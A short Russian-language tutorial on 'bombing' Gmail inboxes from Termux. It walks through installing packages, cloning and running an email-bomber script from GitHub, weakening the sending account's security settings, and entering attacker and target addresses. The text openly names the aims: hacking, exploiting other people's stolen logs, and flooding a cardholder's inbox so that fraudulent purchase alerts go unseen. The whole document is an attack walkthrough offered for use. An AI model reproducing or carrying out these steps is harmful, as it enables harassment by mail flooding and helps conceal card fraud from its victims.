Бомбим Gmail при помощи Termux

Бомбер работает со всеми действительными адресами gmail (иногда довольно медленно), что может помочь при взломе, использовании чужих логов, сокрытия для кардхолдеров оповещений о покупке на почту и т.д.

Обновим пакеты и приступим к установке:

 pkg install php -y

pkg install git -y

pkg install python -y

pkg install python2 -y

cd $HOME

ls

git clone https://github.com/mohinparamasivam/Email-Bomber

ls

cd Email-Bomber

python emailbomber.py

Далее откроется скрипт, выбираем Gmail, который хотим взорвать.  После выбора Gmail откройте его в Chrome и введите его в строке URL https://myaccount.google.com/lesssecureapps. Далее отключаем двухэтапную аутентификацию для Gmail и включаем менее безопасные приложения.
После выполнения всех этих шагов откройте termux и выполните следующие шаги.

Attacker EMAIL - (укажите адрес электронной почты атакующего, с которого отправляется электронное письмо)

Password - (введите сюда свой пароль Gmail, который вы выбрали для атаки)

To - (целевая электронная почта)

Выбираем режим и приступаем к бомбежке. Всё просто!
